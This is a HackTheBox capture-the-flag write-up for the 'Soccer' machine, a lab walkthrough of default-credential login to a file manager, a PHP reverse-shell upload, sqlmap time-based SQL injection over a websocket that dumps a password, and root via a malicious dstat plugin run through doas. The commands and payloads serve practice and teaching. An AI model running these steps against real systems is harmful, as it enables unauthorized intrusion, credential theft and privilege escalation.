---
title: "HackTheBox - Soccer"
author: Nasrallah
description: ""
date: 2024-12-27 07:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, linux, easy, sqli, sqlmap, suid]
img_path: /assets/img/hackthebox/machines/soccer
image:
    path: soccer.png
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---

On [Soccer](https://hacktheboxltd.sjv.io/Nasrallah?u=https://app.hackthebox.com/machines/soccer) we exploit a web file manager to upload a php shell to get a foothold. After that we find another web application running locally that's vulnerable to sql injection, so we retrieve a user password with the help of sqlmap. Finally we exploit a `doas` entry to get a root shell.

## **Enumeration**

### nmap

We start an Nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Host is up (0.31s latency).      [105/138]
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE         VERSION 
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)    
| ssh-hostkey:                         
|   3072 ad:0d:84:a3:fd:cc:98:a4:78:fe:f9:49:15:da:e1:6d (RSA)     
|   256 df:d6:a3:9f:68:26:9d:fc:7c:6a:0c:29:e9:61:f0:0c (ECDSA)    
|_  256 57:97:56:5d:ef:79:3c:2f:cb:db:35:ff:f1:7c:61:5c (ED25519)  
80/tcp   open  http            nginx 1.18.0 (Ubuntu)               
|_http-server-header: nginx/1.18.0 (Ubuntu)                        
|_http-title: Did not follow redirect to http://soccer.htb/        
9091/tcp open  xmltec-xmlmail?         
| fingerprint-strings:                 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix:  
|     HTTP/1.1 400 Bad Request         
|     Connection: close        
```

We found three open ports.

The web server on port 80 redirects to `soccer.htb`, so let's add that to `/etc/hosts`.

### Web

Let's navigate to the website.

![web](1.png)

Nothing interesting on this page, let's run a directory scan.

```terminal
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://soccer.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🚫  Do Not Recurse        │ true
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        7l       12w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        7l       10w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      494l     1440w    96128c http://soccer.htb/ground3.jpg
200      GET     2232l     4070w   223875c http://soccer.htb/ground4.jpg
200      GET      711l     4253w   403502c http://soccer.htb/ground2.jpg
200      GET      809l     5093w   490253c http://soccer.htb/ground1.jpg
200      GET      147l      526w     6917c http://soccer.htb/
301      GET        7l       12w      178c http://soccer.htb/tiny => http://soccer.htb/tiny/
[####################] - 50s    20498/20498   0s      found:6       errors:0      
[####################] - 50s    20477/20477   413/s   http://soccer.htb/
```

We found `/tiny`, let's check it.

![tiny](2.png)

It's a login page of `tiny files manager`, I searched on google for default credentials and found `admin:admin@123`.

![log](3.png)

We logged in successfully.

## **Foothold**

We can see on the dashboard the same files we found with the directory scan, which means this is the website root folder.

I tried uploading a php shell but we don't have write permissions.

There is an uploads directory in `/tiny` that we can write to.

![up](4.png)

We upload a [php rev shell](https://raw.githubusercontent.com/ivan-sincek/php-reverse-shell/master/src/reverse/php_reverse_shell.php).

We setup a listener and navigate to our shell at `http://soccer.htb/tiny/uploads/shell.php`

```terminal
[★]$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.16.7] from (UNKNOWN) [10.129.103.148] 54422
SOCKET: Shell has connected! PID: 1800
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## **Privilege Escalation**

After running linpeas we find that port 3000 is listening locally.

```terminal
╔══════════╣ Active Ports                 
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports                     
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                 
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      1033/nginx: worker
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                 
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                 
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                 
tcp        0      0 0.0.0.0:9091            0.0.0.0:*               LISTEN      -                 
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                 
tcp6       0      0 :::80                   :::*                    LISTEN      1033/nginx: worker
tcp6       0      0 :::22                   :::*                    LISTEN   
```

Nginx configuration shows that this port has the hostname `soc-player.soccer.htb` and it's proxied to port 80.

So we can add the hostname to our `/etc/hosts` and access it without any port forward.

![site](5.png)

The website looks like the one we saw before but here we can login and signup.

We don't have any credentials so i'll create an account.

![acc](6.png)

After creating the account and login in we get presented with a ticket and form that allows us to check whether our ticket is valid or not.

![ticket](7.png)

If we enter another number we get `Ticket doesn't exist`

I started burp and intercepted the request and got this:

![burp](8.png)

The website is making a request to a web socket on port 9091 with some json data.

### SQLinjection

Let's test for sql injection using `sqlmap`.

```terminal
[★]$ sqlmap -u ws://soc-player.soccer.htb:9091 --data '{"id":"12345"}' --batch
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.8.3#stable}
|_ -| . [,]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 20:25:37 /2024-12-24/

JSON data found in POST body. Do you want to process it? [Y/n/q] Y
[20:25:38] [INFO] testing connection to the target URL
[20:25:42] [INFO] checking if the target is protected by some kind of WAF/IPS
[20:25:43] [INFO] testing if the target URL content is stable
[...]
[20:27:03] [INFO] target URL appears to be UNION injectable with 3 columns
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
[20:27:28] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql') 
[20:27:28] [INFO] checking if the injection point on (custom) POST parameter 'JSON id' is a false positive
(custom) POST parameter 'JSON id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 96 HTTP(s) requests:
---
Parameter: JSON id ((custom) POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: {"id":"12345 AND (SELECT 6529 FROM (SELECT(SLEEP(5)))jDSa)"}
---
[20:27:50] [INFO] the back-end DBMS is MySQL
[20:27:50] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
back-end DBMS: MySQL >= 5.0.12
```

The target is vulnerable to `sqli` and it uses `mysql` as a database.

Let's scan for databases.

```terminal
sqlmap -u ws://soc-player.soccer.htb:9091 --data '{"id":"12345"}' --batch --dbs                  
        ___ 
       __H__
 ___ ___[,]_____ ___ ___  {1.8.3#stable}
|_ -| . ["]     | .'| . |               
|___|_  [)]_|_|_|__,|  _|               
      |_|V...       |_|   https://sqlmap.org      
    
sqlmap resumed the following injection point(s) from stored session:          
---         
Parameter: JSON id ((custom) POST)      
    Type: time-based blind              
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)                 
    Payload: {"id":"12345 AND (SELECT 6529 FROM (SELECT(SLEEP(5)))jDSa)"}     
---         
[20:29:24] [INFO] the back-end DBMS is MySQL      
back-end DBMS: MySQL >= 5.0.12          
[20:29:24] [INFO] fetching database names         
[20:29:24] [INFO] fetching number of databases    
[20:29:24] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)        
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y    
[20:30:01] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions               
5
[20:30:14] [INFO] retrieved: 
[20:30:20] [INFO] adjusting time delay to 3 seconds due to good response times

available databases [5]:                [*] information_schema                  
[*] mysql       
[*] performance_schema              
[*] soccer_db                          
[*] sys     
```

We found the database `soccer_db`. Let's scan for tables.

```terminal
★]$ sqlmap -u ws://soc-player.soccer.htb:9091 --data '{"id":"12345"}' --batch -D soccer_db --tables             
        ___                   
       __H__                                                                                   
 ___ ___[']_____ ___ ___  {1.8.3#stable}                                                       
|_ -| . ["]     | .'| . |                                                                      
|___|_  ["]_|_|_|__,|  _|                                                                                                                                                                     
      |_|V...       |_|   https://sqlmap.org       

Database: soccer_db
[1 table]
+----------+
| accounts |
+----------+
```

We found the `accounts` table, let's dump it

```terminal
Database: soccer_db
Table: accounts
[1 entry]
+------+-------------------+----------------------+----------+
| id   | email             | password             | username |
+------+-------------------+----------------------+----------+
| 1324 | player@player.htb | PlayerOftheMatch2022 | player   |
+------+-------------------+----------------------+----------+
```

We got the password of user `player`, now we can ssh.

### root

Linpeas shows us a binary with suid bit called `doas`

```terminal
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
-rwsr-xr-x 1 root root 42K Nov 17  2022 /usr/local/bin/doas                       
```

If we check the man page of this binary it says `doas — execute commands as another user`, os it's just like `sudo`

To know what we can do we need to check the config file located at `/usr/local/etc/doas.conf`

```terminal
player@soccer:~$ cat /usr/local/etc/doas.conf 
permit nopass player as root cmd /usr/bin/dstat
```

We can run `dstat` as root. Let's check this command.

```terminal
player@soccer:~$ file /usr/bin/dstat
/usr/bin/dstat: Python script, ASCII text executable
player@soccer:~$ ls -l /usr/bin/dstat
-rwxr-xr-x 1 root root 97762 Aug  4  2019 /usr/bin/dstat
player@soccer:~$
```

The file is a python script. If we check the man page it tells us `dstat - versatile tool for generating system resource statistics`

It also shows us paths where we can add plugins.

```terminal
FILES
       Paths that may contain external dstat_*.py plugins:

           ~/.dstat/
           (path of binary)/plugins/
           /usr/share/dstat/
           /usr/local/share/dstat/

```

I found out that we have write permission over `/usr/local/share/dstat/`

So I'll create a plugin with the name `dstat_hack.py` with the content of `import os; os.system("/bin/bash")` which is going to launch a shell as root.

```bash
echo 'import os; os.system("/bin/bash")' > /usr/local/share/dstat/dstat_hack.py
```

Now i'll run `dstat` as root and load the plugin with `--hack`.

```terminal
player@soccer:~$ doas -u root /usr/bin/dstat --hack
/usr/bin/dstat:2619: DeprecationWarning: the imp module is deprecated in favour of importlib; see the module's documentation for alternative uses
  import imp
root@soccer:/home/player# id
uid=0(root) gid=0(root) groups=0(root)
```

And just like that we got root!

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).
